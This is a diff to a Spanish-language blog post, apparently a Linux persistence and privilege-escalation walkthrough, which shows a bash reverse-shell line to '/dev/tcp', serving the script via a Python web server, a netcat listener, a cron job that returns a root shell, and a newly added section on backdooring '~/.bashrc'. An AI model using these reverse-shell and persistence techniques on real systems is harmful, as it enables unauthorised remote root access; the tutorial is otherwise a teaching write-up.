@@ -35,7 +35,7 @@ Si se fija he puesto varios "*". ¿Por qué? Así, le estamos diciendo que quere
 #!/bin/bash
 bash -i >& /dev/tcp/ip/puerto 0>&1
 ```
-Para que esto funcione el archivo debe de ser cargado en algún sitio y porque no utilizar python. 
+Para que esto funcione el archivo debe de ser cargado en algún sitio en este caso usaremos python.
 ```python
 python3 -m http.server 8080
 ```
@@ -43,5 +43,10 @@ Tampoco olvides estar escuchando por el puerto 1337 con netcat.
 > ![image](https://github.com/cerodah/blog/assets/82907557/3a314627-6f1e-4323-b000-98e5914e05af)
 
 Como se puede observar en la terminal derecha, al estar esperando un minuto a llegado momento en el que el archivo crontab haga su trabajo y nos de una sesión como root! 
+
+## [](#header-3) Puerta trasera en ".bashrc"
+¿Cómo? Un backdoor en el archivo de configuración de bash. ¡Sí!
+En la mayoría de sistemas Linux y Unix, por defecto la shell predeterminada es la de bash. En esta shell, encontramos su archivo de configuración (~/.bashrc) y es el que se ejecuta cada vez que se inicia una sesión interactiva.
+Podemos ejecutar este comando el cual ejecutamos una instancia interactiva y posteriormente rediriccionamos la entrada y salida de bash hacia un socket de red
 
 
